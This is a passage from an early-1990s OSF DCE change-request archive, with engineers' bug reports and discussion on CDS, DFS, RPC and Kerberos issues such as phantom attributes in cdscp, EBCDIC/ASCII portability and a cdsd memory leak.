        dthread_equal (pthread_equal) should only be used for comparing
        thread pointers.

[05/14/92 public]
This is a defect in the component indicated by the pathname...

[5/15/92 public]
Verified as a code cleanup item still in 1.0.1.

[6/16/92 public]
Changed to enhancement to bug, lowered priority to 3.

[12/7/92 public]
This is not a problem on the reference platforms. Fixing it should be
a 1.1 CDS code cleanup work item.



CR Number                     : 3523
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 4525
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : Invalid attributes are shown for entries.
Reported Date                 : 5/14/92
Found in Baseline             : 1.0
Found Date                    : 5/14/92
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/14/92 public]
        The CDSCP returns an empty set for attributes which are not
      housed in the entry being shown.  Consider the following CDSCP
      request:

           cdscp show directory /.: CDS_LinkTarget

      The CDS_LinkTarget attribute is a soft-link specific attribute,
      and not a directory attribute.  The user/administrator would
      expect a warning, or even an error saying that this attribute
      doesn't exist or the attribute is invalid for the type of
      CDS entry.  Instead we get the following result:

                            SHOW
                       DIRECTORY   /.../c=ca/o=cell3
                              AT   1992-05-05-20:51:57
                  CDS_LinkTarget = <empty set>

     To the user and the administrator, this type of result is extremely
     misleading.  The assumption, upon receiving this kind of result,
     would be that the attribute exists and is multi-valued, but
     doesn't have any values associated with it.

     Consequently, since the user/administrator can use the
     'cdscp add directory' to add attribute values to this 'virtual'
     attribute called CDS_LinkTarget:

          cdscp add  directory /.: CDS_LinkTarget = /.:

     A 'cdscp show directory' command reveals that the attribute
     CDS_LinkTarget was added to the CDS directory entry:

     NOTE:  The attribute to look for is the CDS_LinkTarget.
     --------------------------------------------------------------------
                       SHOW
                  DIRECTORY   /.../c=ca/o=cell3
                         AT   1992-05-05-21:11:34
           RPC_ClassVersion = 0100
                    CDS_CTS = 1992-02-28-00:13:35.996616100/10-00-5a-a8-ab-ef
                    CDS_UTS = 1992-05-05-22:59:34.341095100/10-00-5a-a8-ab-ef
             CDS_ObjectUUID = 009819E4-7EAF-19AD-9B82-10005AA8ABEF
               CDS_Replicas = :
       Clearinghouse's UUID = 0024A9DC-7EAA-19AD-9B82-10005AA8ABEF
                      Tower = ncadg_ip_udp:9.21.22.74
                      Tower = ncacn_ip_tcp:9.21.22.74
               Replica type = master
       Clearinghouse's Name = /.../c=ca/o=cell3/svrs3_ch
               CDS_Replicas = :
       Clearinghouse's UUID = 00273094-1322-1A07-AD56-10005AA8ABEF
                      Tower = ncadg_ip_udp:9.21.22.74
                      Tower = ncacn_ip_tcp:9.21.22.74
               Replica type = readonly
       Clearinghouse's Name = /.../c=ca/o=cell3/TEST_CH_1
                CDS_AllUpTo = 1992-05-05-22:59:38.305872100/10-00-5a-a8-ab-ef
            CDS_Convergence = medium
               CDS_InCHName = allowed
       CDS_DirectoryVersion = 3.0
             CDS_LinkTarget = /.../c=ca/o=cell3
           CDS_ReplicaState = on
            CDS_ReplicaType = 0
              CDS_LastSkulk = 0
             CDS_LastUpdate = 0
                  CDS_Epoch = 009817E6-7EAF-19AD-9B82-10005AA8ABEF
         CDS_ReplicaVersion = 3.0
     --------------------------------------------------------------------

Repeat By:

     Invoke the following CDSCP command:

          cdscp show directory /.: CDS_LinkTarget
          cdscp add  directory /.: CDS_LinkTarget = /.:
          cdscp show directory /.:


Proposed Solution:

     The CDS-Clerk or CDS-Server should check that the attributes
     associate with the entry being shown or modified.

[1/11/92 public]
Quoting from Mark Sawyer:

This is an 'on-purpose'.

"All the 'information-hooks' are in place to prevent modification of
known attributes that are not normally associated with a particular
kind of entity (eg. CDS_LinkTarget and directory).

"However, the logic in ta_modify_attribute() currently treats any
'known' attribute as 'unknown' (ie. user-defined) if the attribute is
not normally associated with the particular entity being modified as in
the above case of a directory entity and the CDS_LinkTarget attribute.

"Although there are restrictions placed on attribute modifications, the
restrictions are not necessarily based on what might be considered
'normal' for a particular entity and attribute combination."

To fix this problem, we propose to add a new error code to the CDS clerk-
server protocol signifying that the attribute is not valid for the indicated
object. We don't believe that overloading another error code is correct.
However, we believe that protocol or API modifications such as this should be
deferred to 1.1. Also we believe that the priority and severity of this
CR should be set to C3.

[01/12/93 public]
This isn't a proity 1. Dropped it to a 3.

[01/15/93 public]
Due to the fact that this would require a protocol change that involves
to great a risk at this point of the project the bug will be deffered.

Priority must remain at a 1 in accordance with ageing rules.

[08/27/93 public]
The fix isn;t terribly complicated but I don't believe the nature
of the bug justifies a protocol change in 1.0.3. It will be done in
1.1.

[6/29/93 public]
Realistically this is not going to happen in 1.1. In fact its 
questionable whether it will be addressed in 1.2 given that it
will require a protocol change. Making it an enhancement request
to be revisited in the 1.2 timeframe.

[6/29/94 public]
Well you could always change the server to allow the add to happen.
Though didn't we already rev the protocol for 1.1?  Why not add the
error code.   The code isn't hard by everyone's admission and if the
protocol is already changed, what is the risk?

Anyway, this is really a defect in the presentation that cdscp does.
Since dcecp doesn't have this problem (you can't ask the server what
value a particular attribute has on an entry, you can only say show me
all the entries on a server) you might want to cancel this.  Though
since we are shipping cdscp in 1.1, this might not be the best approach.

I utterly loathe the concept that because of bug aging this needs to be
a 1.  That is a mistake.  Bugs that are high priority, that we need to
fix should be 1's.  If we aren't going to fix it in the next 6 months,
it's not a priority 1.  This is also not an enhancement.  It is a defect
against cdscp.  Truth in CR's I always say.

[6/29/94 public]
I beg to differ.  cdscp gets back an empty attribute and displays it that way.
This is not a bug by cdscp it cannot tell the difference. 

The server returns an empty set.  It does this cause it cannot actually  be sure that the attribute doesn't exist at another replica, it can only tell you it doesn't have any values for the attribute.  Now I agree this is architectural mumbo jumbo, but that
is the way it is.  

We did not change the protocol for 1.1 so adding a new error code would be a
big deal.  

The explanation of what attributes may appear on what type of entry is also correct.
Linktarget has special meaning to a server when it is on a link entry.  When it is
on another entry, it just doesn't mean anything to the server.

So, this is an enhancement request and is a big deal at this point in time.



CR Number                     : 3514
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : cds/server/sets_lib.c
Short Description             : CDSD -- Abort called without
any error messages or cleanup.
Reported Date                 : 5/14/92
Found in Baseline             : 1.0
Found Date                    : 5/14/92
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/14/92 public]

Full Description:

        The CDS server contains code that checks data to make sure
        it hasn't been corrupted.  If it finds some inconsistency then
        it calls abort and sometimes no message or warning is displayed
        or logged.  Also no cleanup is done before aborting.
        There is no way of determining what went wrong unless debug
        events were turned on and that will just indicate approximately
        where it failed.

        The following functions in sets_lib.c call abort without logging
        an error message when DEBUG is defined:

        val_set_check
        att_set_check
        db_data_check

        This also occurs in the following server files:

        db_btree.c
        names_lib.c

Proposed Solution:

        Log an error message and do some cleanup before calling abort.

[5/14/92 public]
This will be addressed as a code cleanup item. Agreed that this is not
a good thing to do.



CR Number                     : 3508
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cds/server/mgmt_file.c
Short Description             : In cds/server/mgmt_file.c, inconsistent use of file access functions on the same file.
Reported Date                 : 5/14/92
Found in Baseline             : 1.0
Found Date                    : 5/14/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/14/92 public]
Full Description:

        cds_files.txt is created and written to using UNIX file I/O
        funtions in sys_mgmt_file_add but read, in sys_mgmt_file_load,
        using ANSI C file I/O functions.  This causes portability
        problems for non-UNIX machines. This inconsistency also occurs
        with the cds_config file.  It is created and written to using
        ANSI C file I/O in dns_adv_dump_ns in unix_stubs.c and read
        using UNIX file I/O in get_init_clearinghouse in
        clerk_init_cle.c.

Repeat By:

        <A description of how to reproduce the problem (optional)>

Proposed Solution:

        For each file, access to it should be consistent, either UNIX
        file I/O or ANSI file I/O.

[5/14/92 public]
A code cleanup issue that also exists in 1.0.1.



CR Number                     : 3507
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cds/adver/adver_service_rpc.c
Short Description             : In cds/adver/adver_service_rpc.c, type mismatch.  Mutex declared as extern dthread_t.
Reported Date                 : 5/14/92
Found in Baseline             : 1.0
Found Date                    : 5/14/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/14/92 public]
Full Description:

        The mutex clerk_mgmt_acl_th_mutex is defined in adver_dacl.c
        with

        dthread_mutex_t clerk_mgmt_acl_th_mutex;

        but is declared in adver_service_rpc.c with

        extern dthread_t clerk_mgmt_acl_th_mutex;

        This results in a type mismatch compile error.

        This same problem occurs with the mutex server_mgmt_acl_th_mutex
        which is defined as dthread_mutex_t in cds_dacl.c and declared
        with extern dthread_t in dns_service_rpc.c.

Repeat By:

        Compile adver_service_rpc.c and dns_service_rpc.c using the
        C/370 compiler.

Proposed Solution:

        Change adver_service_rpc.c and dns_service_rpc.c to declare the
        mutexes as mutexes and not threads.

        extern dthread_mutex_t clerk_mgmt_acl_th_mutex;
        extern dthread_mutex_t server_mgmt_acl_th_mutex;

[5/14/92 public]
A code cleanup issue that exists in 1.0.1 also.



CR Number                     : 3498
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : 
Short Description             : CDSPI - Default values for optional parameters (Category  : EBCDIC/ASCII Problems)
Reported Date                 : 5/14/92
Found in Baseline             : 1.0
Found Date                    : 5/14/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/14/92 public]
Component (Module):     src/directory/cds/library/dnsenumobj.c
                        src/directory/cds/library/dnsenumgrp.c
                        src/directory/cds/library/dnsenumslink.c
                        src/directory/cds/library/dnsenumchild.c
                        src/directory/cds/library/dnscreategrp.c

Full Description:

        Default values for optional parameters, which happen to be
        opaque data structures, are stored in the static variables
        in the source files. These static variables are initialized
        with char strings which represent the memory map of the opaque
        structures. Eg for dnsEnumObj the default values for name and
        class filter are defined as :

        static byte_t allNames[]   = {"\11\1\*"}
        static byte_t allClasses[] = {"\11\1\*"}

        When this code is compiled on EBCDIC platform, the third byte
        in allNames array will contain the EBCDIC value of char
        "*" which is x'5C' and its corresponding ASCII char is "\".

        Since in DCE 1.0  all names are stored in ONLY ASCII
        8859-1 code page so when an MVS client sends enumerate object
        request to CDS server on AIX none of the names match the name
        filter and empty set of results is returned.

Repeat By:

        Port the DCE code to any non ASCII Platform, invoke the cdscp
        show command (without specifying any Name or class filter) to
        enumerate objects in a clearinghouse stored on AIX server.

Proposed Solution:

        Initialize these static variables (for defaults parameters) to
        the binary values corresponding to the ASCII code points.
        eg .

        static byte_t allNames[]   = {"\11\1\52"}

        Note : ASCII code point for  "*"  is  52 in octal

        Preferably change these static variables to defined constants
        and put them in some header file.

        This is a short term solution for DCE 1.0 in order to port the
        code on EBCDIC Platforms.

        The long term solution for supporting multiple code pages,
        double byte character sets etc and other NLS issues is on
        the agenda of DCE NLS SIG.



CR Number                     : 3497
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : cds/library/cdsstrtosimple.c
Short Description             : In cds/library/cdsstrtosimple.c, passing string names for CDS Entries, Attribute names etc in local code page. (Category EBCDIC/ASCII Problems)
Reported Date                 : 5/14/92
Found in Baseline             : 1.0
Found Date                    : 5/14/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/14/92 public]
Full Description:

        OSF has taken a position to support ONLY ASCII 8859-1 code page
        in DCE 1.0 and CDS names are to be stored in 8859-1
        on ALL systems (including the ones where the local system
        environment is not ASCII ).

        This causes lot of problems while porting DCE code to systems
        running on non ASCII platform. Eg. On MVS (EBCDIC platform)
        CDS client rejects the RPC run time request to create an entry
        in CDS Name space with "Invalid Entry Name". This is because
        the tables (in source file src/directory/cds/library/dnstables.c)
        which contain valid characters for CDS names (Entries, Attributes
        etc) contain the ASCII code points of the valid characters.

        We cannot expect the DCE applications (eg RPC, Security etc)
        running on EBCDIC platform and writing directly to CDSPI
        interface to convert the CDS names from local code page to
        8859-1 before calling CDS Client.

Repeat By:

        Port the DCE code to any non ASCII Platform and run any RPC
        application which exports the binding to CDS Server.

Proposed Solution:

        These tables should serve the dual purpose of checking for
        valid CDS names and performing the conversion from local code
        page to 8859-1 while converting string names to opaque names.
        User should be provided with a list of valid CDS characters for
        string names so that these tables can be tailored for the local
        system environment.

        This is a short term solution for DCE 1.0 in order to port the
        code on non ASCII Platforms.

        The long term solution for supporting multiple code pages, double
        byte character sets etc and other NLS issues is on the agenda
        of DCE NLS SIG.



CR Number                     : 3496
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : control/prs.c,control/prscmd.c
Short Description             : CDSCP parser sensitive to ASCII code points (Category : EBCDIC/ASCII Problems)
Reported Date                 : 5/14/92
Found in Baseline             : 1.0
Found Date                    : 5/14/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/14/92 public]
Full Description:

The cdscp command parser makes the assumption that the commands input
from  terminal are encoded in ASCII. Eg. for checking whether a
character is in lower case or not and then converting  it to upper
case it uses the following logic :

if (cc >= 'a' && cc <= 'z') return (cc &= 0xDF);

In EBCDIC, the lower case letter are not continuous in hex values and
logically ORing 0xDF with the lower case letter does not yield the upper
case value.

The parser logic also uses non syntactic (control) characters which is
going to cause problem not only on EBCDIC platforms but also on ASCII
platforms if a different code page is used.

Repeat By:

Proposed Solution:

-  Make the parsing logic insensitive to code page (NLS enhancement)

- Temporary Relief

Isolate such logic into either one header file or a single
source file so that changes can be easily made.



CR Number                     : 3452
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : efs_rdwr with the IO_SYNC bit does too much work
Reported Date                 : 5/13/92
Found in Baseline             : 1.0.1b15
Found Date                    : 5/13/92
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : file/episode/vnops/efs_vnodeops.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jdp@transarc.com
Transarc Status               : open

[5/13/92 public]
The efs_rdwr routine implements IO_SYNC by calling fsync; this potentially
does extra work and could cause certain types of applications (e.g. ISAM
files being accessed by different programs) to perform very poorly.

It would be better if only those pages modified in the rdwr were forced to
disk, rather than all pages for the file. (As a point of reference, BSD
IO_SYNC acts this way...)

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jdp@transarc.com' 
Added field Transarc Status with value `open'

[5/28/92 public]
Changed Fix By Baseline from `1.1' to `1.0.2'

[8/17/92 public]
Another interesting side-effect here is that when you set the IO_SYNC
bit on a READ request, if the file is dirty, I/O is really done.



CR Number                     : 3426
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : cdscp outputs errors to stdout instead of stderr
Reported Date                 : 5/12/92
Found in Baseline             : 1.0.1b14
Found Date                    : 5/12/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/12/92 public]
All messages output by cdscp, good or bad, go to stdout.  For the purposes
of testing, upon error, I was trying to process stderr to generate a report.
I found that none of the errors I was receiving were being sent to stderr.



CR Number                     : 3390
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : cdscp
Short Description             : cdscp show server fails for 2 machine cell
Reported Date                 : 5/11/92
Found in Baseline             : 1.0.1b14
Found Date                    : 5/11/92
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/11/92 public]

I setup a two-machine cell where dce6 was the server for SEC and CDS, and dce7
is a client-only machine. If I do a "cdscp show server" on DCE6, that works. If I do a "cdscp show server" on DCE7, I get:

Failure in routine: cprpc_get_binding_handle; code = 382312703
RPC protocol not supported by this auth protocol (dce / rpc)
Failure in routine: cp_show_server; code = 382312703
RPC protocol not supported by this auth protocol (dce / rpc)

(messages are properly set).

	-Kenny

[5/12/92 public]

The show server command displays information about the server
running on your local system, so I believe a failure should
occur if you do not have a server running on your system.  
However, I am not sure if you should be seeing the error that
you are.

[5/12/92]

Since the show server command is designed to show information
on the server running on the local host, cprpc_get_binding_handle is
returning whatever the last rpc error was returned by
get_local_binding_handle .  In this case, its 382312703 .
If you run the show server command without issuing a dce_login,
you get different results.  The error you are seeing is a result
of connection oriented auth rpc not being enabled yet.  When it
is, you will see a different error message.  A consistent error
message is probably desired.  

However, for now I would recommend that the priority be lowered since
the error is a result of attempting something that is not supported.
The error message returned can be cleaned up at a later time.

[5/18/92 public]

Changed to enhancement.  This really was an operator error, but one
could argue for better error recovery.



CR Number                     : 3383
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 4459, 8133
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : cds
Subcomponent Name             : cdsd
Short Description             : Memory leak in cdsd.
Reported Date                 : 5/11/92
Found in Baseline             : 1.0.1
Found Date                    : 5/11/92
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[5/11/92 public]

We have noticed a memory leak in the b12 bits of the cdsd .
If we run cp_killer.sh multiple times in a loop, we see the
cdsd increasing in size.  This is true even after a checkpoint
occurs.

Upon investigation, we found that it does not appear that
db_hash_free is being called to free up the memory associated
with a dead directory.  As a possible fix, we tried the
following:

In the routine db_checkpoint, we modified the code:

            /*
             * Check the directory state -- if it's dead, don't write
             * it out to the checkpoint file -- it is a dangling entry
             * anyway.
             */
            if (hash_p->dir_replica_state == RS_dead)
                {
                DEBUG_EVENT(db_checkpoint_info,
                        ("I db_checkpoint() - skipping over a dead replica\n"));
                continue;
                }

to be

            /*
             * Check the directory state -- if it's dead, don't write
             * it out to the checkpoint file -- it is a dangling entry
             * anyway.
             */
            if (hash_p->dir_replica_state == RS_dead)
                {
                DEBUG_EVENT(db_checkpoint_info,
                        ("I db_checkpoint() - skipping over a dead replica\n"));

                if (hash_p->dir_users == 0) {
                   DEBUG_EVENT(db_checkpoint_info,
                        ("Calling db_hash_free to free memory associated with dead directory.\n"));
                   db_hash_free(hash_p, file_p);
                }
                continue;
            }

This frees up memory for dead directories before discarding the
transaction log.

We also modified the routine db_hash_free and added the line
   SERVER_DELETE_CONDITION_OR_BUGCHECK(&hash_p->dir_state_changed);

immediately following the line
   SERVER_DELETE_CONDITION_OR_BUGCHECK(&hash_p->dir_update_accessable);

The deletion of the condition dir_state_changed appeared to have
been forgotten.


These changes appear to free up memory for dead directories when a
checkpoint is done.  We are not extremely confident in the
validity of these changes, however.  They should be examined
closely by DEC.

After these changes were made, a memory leak still existed in the
cds server.  The memory which does not appear to be getting freed
is allocated in the routine create_child in the file ta_create.c .
The line is:
            stream_p->db_entry.data_p =
              (data_record_t *)dns_malloc_temp(INITIAL_RECORD_SIZE);

We are not sure where this memory should be deallocated.

[5/20/92 public]
The malloc(INITIAL_RECORD_SIZE) is not freed because the parent_stream_p
in ta_create_dir() should be released with db_close_stream(), not piecemeal.
Submit coming shortly after test.

[5/26/92 public]
Closed.

[5/27/92 public]
The above close was in error, reopened as an B2.  (Bitten by an
editor macro...)

[6/25/92 public]

Above is a suggested fix to call db_hash_free to free up memory
for dead directories when a checkpoint is done.  Bumping the
priority back up to 1 so that the suggested change gets evaluated.
If this is not the correct change, a memory leak still exists which
causes  information about dead directories to be retained even
after a checkpoint.  Does it need to be?

[7/13/92 public]
The memory leak is in fact a "feature" of the architecture, exacerbated
by some non-optimal implementation practices. The original assumption is
that directories don't get deleted very often in normal operation. This
assumption and the issue of cleanup of stale information will be addressed
in a subsequent release of CDS, as decided by the technical managers.



CR Number                     : 3323
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : kerberos
Short Description             : remove export warning
Reported Date                 : 5/7/92
Found in Baseline             : 1.0.1
Found Date                    : 5/7/92
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[5/7/92 public]
Most kerberos files are not restricted from export.  Please remove
the export warning from the following comment in all files which
are not.

 * Export of this software from the United States of America is assumed
 *   to require a specific license from the United States Government.
 *   It is the responsibility of any person or organization contemplating
 *   export to obtain such a license before exporting.
 *
 * WITHIN THAT CONSTRAINT, permission to use, copy, modify, and
 * distribute this software and its documentation for any purpose and
 * without fee is hereby granted, provided that the above copyright
 * notice appear in all copies and that both that copyright notice and
 * this permission notice appear in supporting documentation, and that
 * the name of M.I.T. not be used in advertising or publicity pertaining
 * to distribution of the software without specific, written prior
 * permission.  M.I.T. makes no representations about the suitability of
 * this software for any purpose.  It is provided "as is" without express
 * or implied warranty.

[5/7/92 public]

I assume that the only lines which should be removed are:

 * Export of this software from the United States of America is assumed
 *   to require a specific license from the United States Government.
 *   It is the responsibility of any person or organization contemplating
 *   export to obtain such a license before exporting.

I think it might be safer to change "is assumed to" to "may":

 * Export of this software from the United States of America may
 *   require a specific license from the United States Government.
 *   It is the responsibility of any person or organization contemplating
 *   export to obtain such a license before exporting.

Is there any problem with this?

[5/14/92 public]
Lowered the priority to 2.

[7/9/93 public]

Note that the phrase in question is a constraint of the license from MIT;
we cannot unilaterally change this without their approval.

I'll ping Ted Ts'o about this and see if he can make anything happen; if
not, we can't change this.

[9/8/93 public]

I just saw mail saying that MIT's licensing folks have approved just such a
change; with any luck it will be in Krb5B3 ...



CR Number                     : 3281
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : Needs server status utility.
Reported Date                 : 5/6/92
Found in Baseline             : 1.0.1
Found Date                    : 5/6/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[5/6/92 public]

Currently the cache manager will only report the status of machines with 
which it has contacted, or needs to contact.  There is no way to determine
the status of all file servers in a given cell.  Perhaps a combination of 
the -cell and -all options could accomplish this.  If not, a new option 
could be added, such as -force.

Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/20/92 public]
Changed "Fix by" to 1.0.2

[7/29/92 public]
Assigned to Mike for analysis and possible further assignment.

Changed Responsible Engr. from `mason@transarc.com' to `kazar@transarc.com' 
Changed Transarc Herder from `mason@transarc.com' to `jaffe@transarc.com'

[7/29/92 public]
The cache manager never knows all the file servers in a cell.  It would not be
reasonable for ``cm statservers'' to scan (the FLDB) for all file servers in a
cell and establish communication with them.  It might be possible to write a
separate command (not the ``cm'' subcommand) that would scan for all such
servers in a cell and initiate contact with them from user space, but that
is no longer doing what this command does, which is to query the CM about all
the file servers with which it has been in contact.

Perhaps this should really be turned into a doc defect, if the doc doesn't
say clearly that the ``cm statservers'' command queries the CM about its
communication with servers with which it is already in contact.  Fred?
Changed Subcomponent Name from `cm statservers' to `cm cmd' 
Filled in Interest List CC with `cfe@transarc.com'

[7/29/92 public]

The current documentation is clearer about what the command actually does, 
i.e. contacting servers it has been in contact with.  However, I still think
DFS should provide a utility to determine the status of all DFS servers in 
a cell.  I will change the short description.

Changed Subcomponent Name from `cm cmd' to `' 
Changed Short Description from `Does not report on all file servers.' to `Needs 
 server status utility.'



CR Number                     : 3155
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : efts createft sets quota in frags not 1Ks
Reported Date                 : 4/30/92
Found in Baseline             : 1.0.1
Found Date                    : 4/30/92
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[4/30/92 public]
The efts createft claims that fileset quota is in 1K units but actually
seems to be in fragments.

This probably afflicts the fts command too.  Either that or it is
correcting for this in someway that efts should duplicate.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[7/16/92 public]
Changed Defect or Enhancement? from `def' to `enh'

[7/20/92 public]
Changed "Fix by" to 1.0.2

[8/31/92 public]
Changed Interest List CC from `wang@sni-usa.com,cfe@transarc.com' to 
 `cfe@transarc.com' 
Changed Responsible Engr. from `ota@transarc.com' to `jdp@transarc.com' 
Changed Transarc Herder from `mason@transarc.com' to `jaffe@transarc.com'



CR Number                     : 3150
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : rpc
Subcomponent Name             : src/rpc/runtime/comnlsn.c
Short Description             : Listener thread retries forever in error when tcp/ip reset.
Reported Date                 : 4/29/92
Found in Baseline             : 1.0
Found Date                    : 4/29/92
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[4/29/92 public]

Full Description:

Listener thread retries forever with error after tcp/ip reset.

        When a tcp/ip is reset or some tcp/ip error occurrs, all
        the socket desc are invalidated and the select in
        lthread_loop will get a bad parameter error. Currently
        the code retries forever. Even after tcp/ip is back up,
        the listener thread still cannot recover from this error.

Repeat By:

        resetting tcp/ip while listener thread is running

Proposed Solution:

        Limit the number if retries and kill the listener thread
        when this happens.

[6/30/92 public]

The DG protocol has code to detect this condition.  Sockets that
consistently fail are closed and removed from the listener thread.
Note that it's not necessary to kill the listener thread unless 
all of its sockets have been closed.

Can you determine from your tests if you are seeing this problem
on both the DG and the CN code?  I don't know if the CN protocol
is able to handle failing sockets.

[10/16/92 public]
Changed code engineer to Wei Hu @ DEC.

[1/7/93 public]
Promote to enhancement.

[09/03/93 public]
This will not be addressed till 1.1. Defering.



CR Number                     : 3095
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : cm
Short Description             : DFS remote SYS V locking cannot supp. dead lock det.
Reported Date                 : 4/28/92
Found in Baseline             : 1.0.1
Found Date                    : 4/28/92
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com

[4/28/92 public]
Currently DFS cannot perform deadlock detection for system V lock request
made by DFS clients.  The Primary reason for this is that the token
manager does not detect deadlock conditions for lock tokens.  Perhaps
the token manager should be enhanced to support this detection so
